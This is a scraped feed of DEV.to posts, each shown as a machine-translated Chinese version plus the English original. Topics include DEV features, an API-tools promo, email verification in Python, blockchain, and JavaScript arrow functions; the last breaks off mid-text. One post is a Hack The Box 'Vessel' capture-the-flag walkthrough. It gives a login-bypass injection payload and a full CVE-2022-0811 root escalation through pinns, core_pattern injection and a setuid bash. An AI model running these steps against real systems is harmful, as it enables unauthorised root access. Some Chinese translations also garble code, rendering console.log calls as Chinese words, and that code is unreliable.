item.title: DEV 上值得期待的一些新功能 | Some new features to look forward to on DEV
item.description:
大家好，我只是想谈谈即将通过Forem在 DEV 上发布的一些即将推出的功能。

这只是一些即将发布的著名作品的简要概述。 随着各个功能在接下来的几个月内上线，我们将分享更多详细信息。

多重反应： 🦄 独角兽回来了，还带来了朋友！

不久前，我们删除了独角兽反应以简化 UI 。 然而，我们打算以“反应抽屉”的形式重新引入这种反应，这将允许更多的反应。 很快您就可以从五种反应中进行选择，我们希望随着时间的推移继续改进它。

我们希望这次更新有助于保持社区活动轻松、有趣和富有表现力。 我们将在下周推出这些。 作为多用途 UI 元素的广告牌

如果你滚动到这篇文章的底部，你会看到一个“广告牌”，这是一个允许灵活内容的网站框。 我们将在整个网站的不同地方推出这些内容，让我们的团队能够策划更多有趣的网站流程。

这些只是“盒子”，但它们在放置位置和显示内容方面提供了很大的灵活性。 在这些广告牌中，您会发现从内容建议到即将举行的活动和编程马拉松的促销，再到有关如何利用您可能错过的平台功能的指南。

随着我们继续投资于广告牌，我们也将删除一些单独的功能。 一个这样的删除是列表，它一直是我们无法投资的领域。我们想做更少的事情，我们已经承诺投资广告牌作为我们选择的实用程序，以提供许多“外围”功能网站。

我们还将允许平台赞助商开始使用广告牌在整个平台上宣传他们的信息。 可以理解，有些人可能更愿意关闭与赞助相关的广告牌，欢迎您直接在设置中这样做。 我们认为大多数人会喜欢看到我们在网站上所做的最新工作，因为我们将与赞助商一起做有趣的事情，但为内容的读者和文章的作者提供这种设置似乎是正确的。

专业组织工具

最后，我们将推出专用工具套件，以帮助我们网站上的专业人士更好地了解他们的关注者并创建更好的内容。 想想“Hootsuite for DEV”，它具有一些专门的功能来帮助组织与社区建立联系。 我们怀疑这对开发者关系组织、开源项目以及介于两者之间的许多用例非常有用。

如果您有兴趣了解更多信息，请联系。

当我们推出所有这些东西时，将会有更多细节！

编码愉快❤️



原文:

Hey folks, just wanted to speak to some upcoming features going live on DEV soon via Forem.

This is just a quick overview of some notable work that will be shipping soon. We’ll share more details as individual features go live throughout the next few months.

Multiple reactions: 🦄 The unicorn is back, and they brought friends!

A little while back, we removed the unicorn reaction in order to simplify the UI. However, we intended to re-introduce this reaction in the form of a “reaction drawer” which will allow for more reactions. Soon you will be able to select from five reactions, and we hope to continue evolving this over time.

We hope this update helps keep activity in the community light-hearted, fun and expressive. We will roll these out next week. 🔥

Billboards as a multi-purpose UI element

If you scroll to the bottom of this post, you’ll see a “billboard”, which is a box on the site that allows for flexible content. We will be rolling these out across the site in different places allowing our team to curate more interesting flows through the site.

These are just “boxes”, but they offer a lot of flexibility as to where they are located and what they can display. In these billboards, you’ll find everything from content suggestions, to promotions for upcoming events and hackathons, to guidance on how to take advantage of features of the platform you may have missed.

As we continue investing into Billboards, we will also be removing some separate functionality. One such removal is Listings which has been an area we have not been able to invest in. We want to do fewer things well, and we’ve committed to investing into billboards as our chosen utility for serving a lot of “peripheral” functionality across the site.

We’ll also be allowing platform sponsors to begin using Billboards to promote their message across the platform. Understandably, some folks might prefer to turn off billboards related to sponsorships, and you’re welcome to do so directly in your settings. We think that most people will enjoy seeing the latest of what we’re doing on the site, because we’ll be doing interesting things with sponsors, but it just seems right to offer this setting to both readers of content and writers of articles.

Pro Organization Tooling

Finally, we will be rolling out a dedicated tooling suite to help professionals on our site better understand their followers and create better content. Think “Hootsuite for DEV” with some dedicated functionality to help organizations connect with the community. We suspect this will be very useful for developer relations organizations, open source projects, and lots of use cases in-between.

If you're interested in learning more, please get in touch.

There will be more details to come on all of these things as we roll them out!

Happy coding ❤️
item.author: ben

item.title: 本周你的胜利是什么？ | What was your win this week?
item.description:
发表于 2 月 17 日

嘿哟！

希望大家周末愉快！ 回顾过去的一周，您为完成什么事情感到自豪？

所有的胜利都很重要 — 无论大小 🎉

开始一个新项目

  • 修复一个棘手的错误
  • 清理你的地方🧹

    • 一旦暂停，michaeltharrington 将无法发表评论或发布帖子，直到他们的暂停被取消。

    解除暂停后，michaeltharrington 将能够再次发表评论和发布帖子。

    一旦取消发布，michaeltharrington 的所有帖子都将隐藏起来，只有他们自己可以访问。

    如果 michaeltharrington 没有被暂停，他们仍然可以从他们的仪表板重新发布他们的帖子。

    笔记：

    感谢您保护 DEV 社区 👩‍💻👨‍💻 的安全。 以下是标记 michaeltharrington 的方法：

    降低 michaeltharrington 的所有帖子的可见度

    报告其他不当行为

    取消标记 michaeltharrington 将恢复其帖子的默认可见性。



    原文:

    Michael Tharrington (he/him)

    Posted on Feb 17

    Heyo!

    Hope y'all all have fantastic weekends! 🙌

    Looking back on this past week, what was something you were proud of accomplishing?

    All wins count — big or small 🎉

    Examples of 'wins' include:

    • Starting a new project
    • Fixing a tricky bug
    • Cleaning up your place 🧹

    >> Check out this classic DEV post <<

    Pachi 🪐 (she/her/ela) - Sep 29 '22

    Once suspended, michaeltharrington will not be able to comment or publish posts until their suspension is removed.

    Once unsuspended, michaeltharrington will be able to comment and publish posts again.

    Once unpublished, all posts by michaeltharrington will become hidden and only accessible to themselves.

    If michaeltharrington is not suspended, they can still re-publish their posts from their dashboard.

    Note:

    Thanks for keeping DEV Community 👩‍💻👨‍💻 safe. Here is what you can do to flag michaeltharrington:

    Make all posts by michaeltharrington less visible

    michaeltharrington consistently posts content that violates DEV Community 👩‍💻👨‍💻's code of conduct because it is harassing, offensive or spammy.

    Report other inappropriate conduct

    Unflagging michaeltharrington will restore default visibility to their posts.
item.author: michaeltharrington

item.title: 开源与专有 API 开发工具：为什么开源开发工具更好？ | Open-Source vs. Proprietary API Development Tools: Why open-source development tools are Better?
item.description:
这些工具提供了一系列功能，使开发人员可以更轻松地使用 API，例如创建和测试端点、生成文档以及监控性能。

我们正在构建Hoppscotch - 一个开源 API 开发生态系统。
它们提供了一组功能，可帮助开发人员快速高效地创建、测试和部署 API。 然而，当谈到在开源和专有 API 开发工具之间进行选择时，许多开发人员常常感到困惑。 在这篇博文中，我们将讨论为什么开源开发工具优于专有工具。

什么是开源 API 开发工具？

开源 API 开发工具是对公众免费提供的软件工具。 它们由共同努力改进软件的开发人员社区开发和维护。 想要定制软件以满足其特定需求的开发人员经常使用开源工具。

什么是专有 API 开发工具？

专有 API 开发工具是公司拥有的软件工具。 它们由拥有它们的公司开发和维护。 专有工具通常由想要使用专为满足其需求而设计的工具的开发人员使用。

为什么开源开发工具更好？

成本

开源开发工具的主要优点之一是它们可以免费使用。 开发人员可以下载、使用和修改软件而无需支付任何许可费用。 这使得开源工具成为预算紧张的开发人员的一个有吸引力的选择。

灵活性

开源开发工具是高度可定制的。 开发人员可以修改软件以满足他们的特定需求。 这意味着开发人员可以根据需要添加新功能、修复错误并改进软件。 另一方面，专有工具通常在定制方面受到限制。

社区支持

开源开发工具由开发人员社区开发和维护。 这意味着开发人员可以从使用相同软件的其他开发人员那里获得帮助和支持。 社区可以提供有关错误修复、功能请求和其他问题的帮助。

透明度

开源开发工具是透明的。 开发人员可以查看源代码并了解软件的工作原理。 这意味着开发人员可以更快地识别和修复错误。 另一方面，专有工具通常是不透明的，使开发人员很难理解软件的工作原理。

创新

开源开发工具通常处于创新的前沿。 使用开源工具的开发人员社区通常非常积极地创建新的和创新的解决方案。 这意味着开源工具通常具有专有工具所不具备的功能。

结论

对于想要构建和管理 API 的开发人员来说，开源开发工具是更好的选择。 它们免费、灵活且高度可定制。 他们还有一个强大的开发人员社区，可以提供支持和帮助。 开源工具是透明的，使开发人员更容易理解和修复错误。 最后，开源工具通常处于创新的前沿，为开发人员提供全新的创新解决方案。

我们正在构建Hoppscotch - 一个开源 API 开发生态系统。
GitHub ↗ - Web app ↗ GitHub ↗ -网络应用程序 ↗



原文:

API (Application Programming Interface) development tools are software solutions designed to help developers create, manage, and integrate APIs into their applications. These tools provide a range of functionalities that make it easier for developers to work with APIs, such as creating and testing endpoints, generating documentation, and monitoring performance.

We're building Hoppscotch - an open-source API development ecosystem.
GitHub ↗ - Web app ↗

API development tools are essential for building and managing APIs. They provide a set of functionalities that help developers create, test, and deploy APIs quickly and efficiently. However, when it comes to choosing between open-source and proprietary API development tools, many developers are often confused. In this blog post, we will discuss why open-source development tools are better than proprietary ones.

What are Open-Source API Development Tools?

Open-source API development tools are software tools that are freely available to the public. They are developed and maintained by a community of developers who work together to improve the software. Open-source tools are often used by developers who want to customize the software to meet their specific needs.

What are Proprietary API Development Tools?

Proprietary API development tools are software tools that are owned by a company. They are developed and maintained by the company that owns them. Proprietary tools are often used by developers who want to use a tool that has been specifically designed for their needs.

Why Open-Source Development Tools are Better?

Cost

One of the main advantages of open-source development tools is that they are free to use. Developers can download, use, and modify the software without any licensing fees. This makes open-source tools an attractive option for developers who are working on a tight budget.

Flexibility

Open-source development tools are highly customizable. Developers can modify the software to meet their specific needs. This means that developers can add new features, fix bugs, and improve the software as needed. Proprietary tools, on the other hand, are often limited in terms of customization.

Community Support

Open-source development tools are developed and maintained by a community of developers. This means that developers can get help and support from other developers who are using the same software. The community can provide help with bug fixes, feature requests, and other issues.

Transparency

Open-source development tools are transparent. Developers can see the source code and understand how the software works. This means that developers can identify and fix bugs more quickly. Proprietary tools, on the other hand, are often opaque, making it difficult for developers to understand how the software works.

Innovation

Open-source development tools are often at the forefront of innovation. The community of developers who work on open-source tools are often highly motivated to create new and innovative solutions. This means that open-source tools often have features that are not available in proprietary tools.

Conclusion

Open-source development tools are a better choice for developers who want to build and manage APIs. They are free, flexible, and highly customizable. They also have a strong community of developers who provide support and help. Open-source tools are transparent, making it easier for developers to understand and fix bugs. Finally, open-source tools are often at the forefront of innovation, providing developers with new and innovative solutions.

We're building Hoppscotch - an open-source API development ecosystem.
GitHub ↗ - Web app ↗
item.author: liyasthomas

item.title: Hack The Box - Vessel [困难] - 演练 | Hack The Box - Vessel [Hard] - Walkthrough
item.description:
由于在视频中执行此操作非常耗时，因此本文将以文本形式进行。

机器被标记为困难是有充分理由的，大多数任务都很耗时，但也有一些有趣的漏洞，如CVE-2022-0811和CVE-2022-24637 。

除此之外，我们还有NoSQL 注入和一些 PE 逆向工程。

写上去

首先，我开始用ffuf枚举整个网站。

 $ ffuf -w ~/Tools/SecLists/Discovery/Web-Content/common.txt -u "http://vessel.htb/FUZZ" -fs 26

然后我发现了一个名为dev的文件夹，然后我转储了该网站的 git 存储库：

 $ git-dumper http://vessel.htb/dev/.git ./website_dump

网站可用后，我可以检查实际源代码是否存在漏洞，在打开routes/index.js后我立即注意到这段代码可能容易受到 NoSQL 注入攻击。

 ... let username = req.body.username; let password = req.body.password; if (username && password) { connection.query('SELECT * FROM accounts WHERE username = ? AND password = ?', [username, password], function(error, results, fields) { ...

代码不检查传递的值是否是对象，我可以使用精心设计的 NoSQL 负载在执行 POST 请求时使用此负载成功登录管理员用户：

 username=admin&password[password]=1

在管理面板中的另一个发现中，我发现主机上还有另一个名为openwebanalytics的域。 通过进一步调查那里可以利用的内容，我找到了CVE-2022-24637 。 利用该漏洞，我可以在机器上成功运行反向 shell。

使用linpeas我在用户steven上找到了一些有用的信息

/home/steven/passwordGenerator # Windows PE Exectuable /home/steven/.notes/screenshot.png # Screenshot of some program /home/steven/.notes/notes.pdf # Password protected PDF

我怀疑screenshot.png是passwordGenerator的图像。另一方面， passwordGenerator异常大，该二进制文件的全部用途是创建“安全”密码。 我注意到二进制文件上的 python 图标，我怀疑这可能是一个带有PyInstaller的打包 python 项目。 当我将整个东西加载到 Ghidra/IDA 中时，我确认了这一点。

我使用pyinstxtractor提取*.pyc文件，然后使用uncomplyle6反编译*.pyc文件。 这让我找到了二进制文件的实际源代码：

这是生成密码的函数：

 def genPassword(self): length = value char = index if char == 0: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?' else: if char == 1: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' else: if char == 2: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890' else: try: qsrand(QTime.currentTime().msec()) password = '' for i in range(length): idx = qrand() % len(charset) nchar = charset[idx] password += str(nchar) except: msg = QMessageBox() msg.setWindowTitle('Error') msg.setText('Error while generating password!, Send a message to the Author!') x = msg.exec_() return password

我将length编辑为 32（如我在屏幕截图中所显示的那样），并对脚本进行了更多编辑，以创建一个包含可能密码的列表。 我可以这样做，因为QTime.currentTime().msec()函数返回 1-1000 范围内的数字，我很有可能猜到生成的密码。

注意：此过程可能有点令人沮丧，因为生成密码需要时间。 我个人花了一个多小时。

然后我用pdfcrack破解了 PDF 的密码，在那里我找到了用户ethan的密码，我用它成功登录，我找到了第一个标志。

标志 2

我再次运行linpeas.sh ，我发现了以下SUID二进制文件：

 ... ╔══════════╣ Readable files belonging to root and readable by me but not world readable -rwsr-x--- 1 root ethan 814936 Mar 15 2022 /usr/bin/pinns ...

我搜索了一下这是什么，然后找到了利用此二进制文件的CVE-2022-0811 。 在执行此操作时，我注意到我也有runc 。

 ╔══════════╣ Container related tools present /usr/sbin/runc

这是一个非常棘手的过程，需要对成功执行攻击的过程有所了解。 您可以查看我为CVE-2022-0811提供的链接以了解更多相关信息。 在实际的 POC 中，他们使用了 Kubernetes，而在我们这边，我不得不使用runc 。

传递给pinns的参数没有经过清理和验证，因此我可以使用它来执行具有根访问权限的代码。

我需要在不使用root情况下使用runc创建一个容器，所以我使用了--rootless arg。

参考： github.com/opencontainers/runc/#rootles ...

 $ mkdir /tmp/syl $ cd /tmp/syl/ $ runc spec --rootless $ mkdir rootfs $ echo "chmod +s /usr/bin/bash" > syl.sh

然后我应该将根目录挂载到容器的根目录：

参考： book.hacktricks.xyz/linux-hardening/pri ...

 $ runc --root /tmp/syl/ run alpine # cat /etc/machine-id c4ca4238a0b923820dcc509a6f75849b

这将运行容器并生成一个 shell。 接下来，我将从另一个会话 ssh 进入机器，以将pinns二进制文件执行到我们的容器。

 $ /usr/bin/pinns -d /var/run -f c4ca4238a0b923820dcc509a6f75849b -s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/tmp/syl/syl.sh #' --ipc --net --uts --cgroup

然后我需要触发核心转储，以便pinns在核心转储的情况下执行脚本。 在 crowdstrike 中遵循 PoC：

 # ulimit -c unlimited # ulimit -c unlimited # tail -f /dev/null & # ps .. Find the `tail -f /dev/null` PID # kill -SIGSEGV {thePID} [1]+ Segmentation fault (core dumped) tail -f /dev/null

回到另一个会话

$ bash -p $ cat /root/root.txt {HASH}

一旦被暂停，syrull 将无法发表评论或发布帖子，直到他们的暂停被解除。

解除暂停后，syrull 将能够再次发表评论和发布帖子。

一旦取消发布，syrull 的所有帖子都将隐藏起来，只有他们自己可以访问。

如果 syrull 没有被暂停，他们仍然可以从他们的仪表板重新发布他们的帖子。

笔记：

感谢您保护 DEV 社区 👩‍💻👨‍💻 的安全。 以下是您可以用来标记 syrull 的操作：

降低 syrull 的所有帖子的可见度

报告其他不当行为

取消标记 syrull 将恢复其帖子的默认可见性。



原文:

Since it becomes very time consuming doing this in a video this write-up is going to be in a text.

The machine is labeled hard with a good reason, most of the tasks are time consuming but there are some interesting vulnerabilities like CVE-2022-0811 and CVE-2022-24637.

On top of these we have NoSQL Injection and some PE reverse engineering.

Write-up

First I began enumerating the whole website with ffuf.

$ ffuf -w ~/Tools/SecLists/Discovery/Web-Content/common.txt -u "http://vessel.htb/FUZZ" -fs 26

With that I discovered a folder called dev which then led me to dumping the git repository of the website:

$ git-dumper http://vessel.htb/dev/.git ./website_dump

With the website avaliable, I can check the actual source code for vulnerabilities, immediately after opening the routes/index.js I have noticed that this code might be vulnerable to NoSQL Injection.

...
let username = req.body.username;
let password = req.body.password;
if (username && password) {
connection.query('SELECT * FROM accounts WHERE username = ? AND password = ?', [username, password], function(error, results, fields) { ...

The code doesn't check if the passed values if they are objects, I can use a crafted NoSQL payload to successfully login with the admin user using this payload while doing the POST request:

username=admin&password[password]=1

Upon another discovery in the admin panel, I found that there is another domain on the host called openwebanalytics. From further investigation over what can be exploted there I have landed on CVE-2022-24637. With that exploit I could run a successful reverse shell on the machine.

Using linpeas I found some useful information over the user steven

/home/steven/passwordGenerator # Windows PE Exectuable
/home/steven/.notes/screenshot.png # Screenshot of some program
/home/steven/.notes/notes.pdf # Password protected PDF

I suspected that the screenshot.png is am image of the passwordGenerator.On the other hand the passwordGenerator was unusually big and the whole use of that binary is to create 'secure' passwords. I noticed the python icon on the binary and I suspected that this could be a packed python project with PyInstaller. I confirmed that when I loaded the whole thing in Ghidra/IDA.

I have used pyinstxtractor to extract the *.pyc files, and then the uncomplyle6 to decompile the *.pyc files. Which has led me to the actual source code of the binary:

This is the function that generates the password:

def genPassword(self): length = value char = index if char == 0: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?' else: if char == 1: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' else: if char == 2: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890' else: try: qsrand(QTime.currentTime().msec()) password = '' for i in range(length): idx = qrand() % len(charset) nchar = charset[idx] password += str(nchar) except: msg = QMessageBox() msg.setWindowTitle('Error') msg.setText('Error while generating password!, Send a message to the Author!') x = msg.exec_() return password

I edited the length to 32 (as I have it on the screenshot) and edited the script a bit more to create a list out of possible passwords. I can do that because the QTime.currentTime().msec() function returns the numbers from 1-1000 with that range I have a big chance of guessing the generated password.

Note: This process can be a bit frustrating since it takes time to generate the passwords. I personally spent little over an hour.

Then I used pdfcrack to crack the password of the PDF, there I found the password for the user ethan and I successfully logged in with it and I found the first flag.

Flag 2

I ran linpeas.sh again, and I found the following SUID binary:

...
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rwsr-x--- 1 root ethan 814936 Mar 15  2022 /usr/bin/pinns    
...

I searched around a bit what is this, and I landed on the CVE-2022-0811 which exploited this binary. While doing this, I noticed that I also have the runc.

╔══════════╣ Container related tools present
/usr/sbin/runc

This was a very tricky one, and it needs some understanding of what's going on to successfully execute the attack. You can check out the link I've provided for CVE-2022-0811 to understand more about it. On the actual POC they have used Kubernetes, on our end I had to use runc.

The parameters that are being passed to pinns are not being sanitized and validated, so I can use that to execute code with root access.

I needed to create a container using the runc without using root so I've used the --rootless arg.

Reference: github.com/opencontainers/runc/#rootles…

$ mkdir /tmp/syl
$ cd /tmp/syl/
$ runc spec --rootless
$ mkdir rootfs
$ echo "chmod +s /usr/bin/bash" > syl.sh

Then I should mount the root to the root of the container:

Reference: book.hacktricks.xyz/linux-hardening/pri…

$ runc --root /tmp/syl/ run alpine
# cat /etc/machine-id
c4ca4238a0b923820dcc509a6f75849b

This will run the container and spawn a shell. Next I would ssh into the machine from another session to execute the pinns binary to our container.

$ /usr/bin/pinns -d /var/run -f c4ca4238a0b923820dcc509a6f75849b -s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/tmp/syl/syl.sh #' --ipc --net --uts --cgroup

Then I need to trigger a core dump so that the pinns would execute the script in a case of a core dump. Following the PoC in crowdstrike:

# ulimit -c unlimited
# ulimit -c
unlimited
# tail -f /dev/null &
# ps
.. Find the `tail -f /dev/null` PID
# kill -SIGSEGV {thePID}
[1]+  Segmentation fault (core dumped) tail -f /dev/null

Back to the other session

$ bash -p
$ cat /root/root.txt
{HASH}

>> Check out this classic DEV post <<

Once suspended, syrull will not be able to comment or publish posts until their suspension is removed.

Once unsuspended, syrull will be able to comment and publish posts again.

Once unpublished, all posts by syrull will become hidden and only accessible to themselves.

If syrull is not suspended, they can still re-publish their posts from their dashboard.

Note:

Thanks for keeping DEV Community 👩‍💻👨‍💻 safe. Here is what you can do to flag syrull:

Make all posts by syrull less visible

syrull consistently posts content that violates DEV Community 👩‍💻👨‍💻's code of conduct because it is harassing, offensive or spammy.

Report other inappropriate conduct

Unflagging syrull will restore default visibility to their posts.

item.title: 如何使用 Python 验证电子邮件地址 | How to Verify Email Addresses Using Python
item.description:
电子邮件验证是涉及确认电子邮件地址的真实性或合法性的过程。 如今，企业正在将电子邮件验证整合到他们的日常运营中，事实证明这更有效，因为它可以帮助他们只保留有效且可访问的客户电子邮件地址。 可用的电子邮件验证工具既酷又复杂，但它们带有价格标签，对于开发人员来说，永远不应该挤成一团，因为您可以构建自己的工具来验证单个电子邮件或批量电子邮件。 在本文中，我将向您展示如何使用名为verify-email的 Python 库构建您自己的电子邮件验证工具。

这是目录：

  • 安装所需的包

  • 验证单个电子邮件地址

  • 验证批量电子邮件地址

  • 最后的想法

安装所需的包

首先，您需要安装验证电子邮件包。 确保pip在您的计算机上正常运行，在您的终端中运行以下命令来安装软件包：
$ pip install verify-email
验证单个电子邮件地址

首先，打开一个新的 Python 文件，将其命名为email-verifier-script.py ，然后在文件顶部执行以下导入：
from verify_email import verify_email
导入后，您需要创建一个电子邮件验证处理程序，这是一个处理电子邮件验证过程的函数。 调用函数email_verifier()并使其看起来像这样：

 def email_verifier(email): # verifying email using verify_email function verify = verify_email(email) # checking if the verify value is True if verify == True: print(f'{email} is a valid email address') # checking if the verify value is False elif verify == False: print(f'{email} is not a valid email address')

用户提供电子邮件地址后，需要对其进行验证，为此执行如下函数调用：

 # calling the email_verifier function email_verifier(my_email)

现在您已准备好验证您的第一个电子邮件地址，打开终端并导航到脚本所在的目录。 使用此命令运行此脚本：
python email-verifier-script.py

系统将提示您输入电子邮件地址，如果电子邮件地址有效，输出将如下所示：

如果您输入了一个无效的电子邮件地址，这就是您得到的：

验证批量电子邮件地址

在本节中，您将验证电子邮件地址列表，因此调整email-verifier-script.py文件，使其看起来像这样：

 from verify_email import verify_email # a list of email addresses to be verified email_addresses = ['khumboklein@gmail.com', 'muo@gmail.com', 'admin@gmail.com', 'kchilamwa@hackbits.tech', 'trainings@updates.internshala.com', 'noreply@medium.com', 'maryellen.m@valnetinc.com'] for email in email_addresses: # verify individual email address verify = verify_email(email) # checking if verify is True if verify == True: print(f'{email} is a valid email address') # checking if verify is False elif verify == False: print(f'{email} is not a valid email address')

在代码片段中，有一个电子邮件地址列表。 在for 循环中，一封电子邮件正在被单独验证。

运行脚本，输出将是：

最后的想法

借助 Python 的多功能性，您可以使用几行代码构建您的免费电子邮件地址验证程序，这非常方便，而且比使用高级电子邮件验证服务更便宜。



原文:

Email verification is a process that involves the confirmation of the authenticity or legitimacy of an email address. Nowadays businesses are integrating email verification into their day-to-day operations and this has proved to be more effective as it helps them keep only customers' email addresses that are valid and reachable. The email verifying tools that are available out there are cool and sophisticated but they come with a price tag, for a developer that should never be a huddle because you can build your own tool to verify a single email or bulk email. In this article, I will show you how you can build your own email verification tool using the Python library called verify-email.

Here is the Table of Contents:

  • Installing the Required Package

  • Verifying a Single Email Address

  • Verifying Bulk Email Addresses

  • Final Thoughts

Installing the Required Package

First things first, you need to have the verify-email package installed. Ensure that pip is working on your computer, in your terminal run the below command to install the package:
$ pip install verify-email
The verify-email package verifies email addresses by checking the domain name and pinging the handler or username for its existence.

Verifying a Single Email Address

Firstly, open a new Python file, call it email-verifier-script.py, and on top of the file do the following import:
from verify_email import verify_email
After doing the import, you need to create an email verifying handler, this is a function that will handle the email verification process. Call the function email_verifier() and make it look like this:

def email_verifier(email):
    # verifying email using verify_email function
    verify = verify_email(email)
    # checking if the verify value is True
    if verify == True:
        print(f'{email} is a valid email address')
    # checking if the verify value is False
    elif verify == False:
        print(f'{email} is not a valid email address')

The email_verifier() function is taking an argument email, this will be provided by the user, so do the following:

# getting email from user
my_email = input('Enter email address:')

After the user has provided the email address, it needs to be verified, to do that do a function call as below:

# calling the email_verifier function
email_verifier(my_email)

Now you are set to verify your first email address, open the terminal and navigate to the directory where the script is located. Run this script using this command:
python email-verifier-script.py

You will be prompted to enter an email address, if the email address is valid, the output will look like this:

If you enter an invalid email address, this is what you get:

Verifying Bulk Email Addresses

In this section, you will get to verify a list of email addresses, so tweak the email-verifier-script.py file so that it looks like this:

from verify_email import verify_email

# a list of email addresses to be verified
email_addresses = ['khumboklein@gmail.com', 'muo@gmail.com', 
                   'admin@gmail.com', 'kchilamwa@hackbits.tech',
                   'trainings@updates.internshala.com', 'noreply@medium.com',
                   'maryellen.m@valnetinc.com']

for email in email_addresses:
    # verify individual email address
    verify = verify_email(email)

    # checking if verify is True
    if verify == True:
        print(f'{email} is a valid email address')

    # checking if verify is False
    elif verify == False:
        print(f'{email} is not a valid email address')

In the code snippet, there is a list of email addresses. The for loop is looping through all the email addresses in the list. Inside the for loop, an email is being verified individually.

Running the script, the output will be:

Final Thoughts

With Python’s versatility, you can build your free email address verifier with a few lines of code, this comes in handy and it’s cheaper than using a premium email verifying service.
item.author: khumbolamulungu

item.title: 区块链-101 | Blockchain-101
item.description:
区块链是一项革命性的技术，正在改变我们开展业务和在线互动的方式。 它本质上是一个去中心化的分布式账本，用于安全透明地记录交易。 在这篇博文中，我们将提供区块链 101 概述，包括其历史、工作原理以及当前和潜在的应用。

区块链的历史：-

区块链的概念于 2008 年由一个不知名的人或团体使用化名中本聪首次提出。 中本聪发表了一份题为“比特币：点对点电子现金系统”的白皮书，描述了一种基于区块链技术的去中心化数字货币。

区块链技术最初被用作比特币的底层技术，比特币是第一个也是最著名的加密货币。 然而，自诞生以来，区块链已被用于数字货币以外的各种应用，包括供应链管理、投票系统等。

区块链如何运作：-

区块链的核心是一种数字分类账，以安全、透明和去中心化的方式记录交易。 区块链中的每个区块都包含一组交易，并且一旦将区块添加到链中，就无法更改。 这使得区块链成为网络上发生的所有交易的不可变记录。

为确保交易安全和透明，区块链使用称为共识的过程。 为了将区块添加到区块链，计算机网络必须首先验证区块中的交易。 这个验证过程称为挖矿，它涉及解决复杂的数学方程式，以便将新块添加到链中。

一旦一个块被添加到链中，它就成为区块链的永久部分，并且不能在不更改链中所有后续块的情况下进行更改。 这使得区块链成为一种存储和传输数据的极其安全的方式，因为一旦将数据添加到链中，就几乎不可能操纵或破解数据。

区块链的应用：-

区块链技术有许多潜在的应用，包括：

结论 ：-

区块链是一项革命性的技术，有可能改变我们开展业务和在线互动的方式。 其去中心化的分布式账本为网络上发生的所有交易提供了安全、透明和不可变的记录。 虽然区块链仍然是一项相对较新的技术，但它已经被用于各种应用，其潜在用途几乎是无限的。 随着技术的不断发展和成熟，它无疑将在我们的数字生活中发挥越来越重要的作用。



原文:

Blockchain is a revolutionary technology that is transforming the way we do business and interact with each other online. It is essentially a decentralized, distributed ledger that is used to record transactions securely and transparently. In this blog post, we will provide a Blockchain 101 overview, including its history, how it works, and its current and potential applications.

History of Blockchain :-

The concept of a blockchain was first introduced in 2008 by an unknown person or group using the pseudonym Satoshi Nakamoto. Nakamoto published a white paper titled "Bitcoin: A Peer-to-Peer Electronic Cash System," which described a decentralized, digital currency that was based on blockchain technology.

Blockchain technology was initially used as the underlying technology for Bitcoin, which is the first and most well-known cryptocurrency. However, since its inception, blockchain has been used in various applications beyond just digital currencies, including supply chain management, voting systems, and more.

How Blockchain Works :-

At its core, blockchain is a digital ledger that records transactions in a way that is secure, transparent, and decentralized. Each block in the blockchain contains a set of transactions, and once a block is added to the chain, it cannot be altered. This makes blockchain an immutable record of all transactions that have taken place on the network.

To ensure that the transactions are secure and transparent, blockchain uses a process called consensus. In order to add a block to the blockchain, a network of computers must first validate the transactions in the block. This validation process is called mining, and it involves solving complex mathematical equations in order to add a new block to the chain.

Once a block has been added to the chain, it becomes a permanent part of the blockchain, and cannot be altered without changing all subsequent blocks in the chain. This makes blockchain an incredibly secure way of storing and transmitting data, as it is virtually impossible to manipulate or hack the data once it has been added to the chain.

Applications of Blockchain :-

Blockchain technology has numerous potential applications, including:

1) Cryptocurrencies: Bitcoin and other digital currencies use blockchain technology to securely record transactions.

2) Supply chain management: Blockchain can be used to track the movement of goods throughout the supply chain, providing transparency and security.

3) Voting systems: Blockchain can be used to create secure and transparent voting systems that are resistant to fraud.

5) Healthcare: Blockchain can be used to securely store and share medical records and other sensitive healthcare data.

6) Real estate: Blockchain can be used to create a secure and transparent system for buying and selling real estate.

Conclusion :-

Blockchain is a revolutionary technology that has the potential to transform the way we do business and interact with each other online. Its decentralized, distributed ledger provides a secure, transparent, and immutable record of all transactions that take place on the network. While blockchain is still a relatively new technology, it is already being used in a variety of applications, and its potential uses are virtually limitless. As the technology continues to evolve and mature, it will undoubtedly play an increasingly important role in our digital lives.
item.author: spyder15

item.title: JavaScript 中箭头函数和常规函数的区别 | Differences between arrow function and regular function in JavaScript
item.description:
通过理解差异，可以针对特定需求使用正确的语法。

定义函数的常用方法之一是使用 function 关键字。

 
function double(x){
 return x*2; }
 
const double = function(x){
 return x*2; }

在这篇博客中，我将这些类型称为常规函数。

在这篇博客中，我将讨论常规函数和箭头函数之间的一些主要区别。

在常规函数内部，此值（即执行上下文）是动态的，取决于调用函数的方式。

在简单调用期间，this 的值等于全局对象。

 function demo(){
 console.log(this)
 }
 演示（）； // logs global window object // 记录全局窗口对象

在方法调用期间，this 的值等于拥有它的对象。


 const myDemo = { greet(){
 控制台日志（这个）；
 } }

} }


我的Demo.greet(); // logs myDemo Object // 记录 myDemo 对象

在构造函数调用期间，this 的值引用新创建的实例。


 function Demo() {
 console.log(this);
 }
 新演示（）； // logs an instance of Demo // 记录一个 Demo 实例

箭头函数没有定义它自己的执行上下文。

箭头函数内部的 this 值与其外部函数的值相同。 换句话说，箭头函数从词法上解析 this 的值，并且这种行为与函数的执行方式和执行位置无关。

 const myDemo = { greet(){
 控制台日志（这个）；


控制台日志（这个）； 内（）;
 } }

} }


我的Demo.greet();

箭头函数的这一强大功能可确保当您将箭头函数用作回调时，它不会定义自己的执行上下文。

2. Constructors 2.构造函数

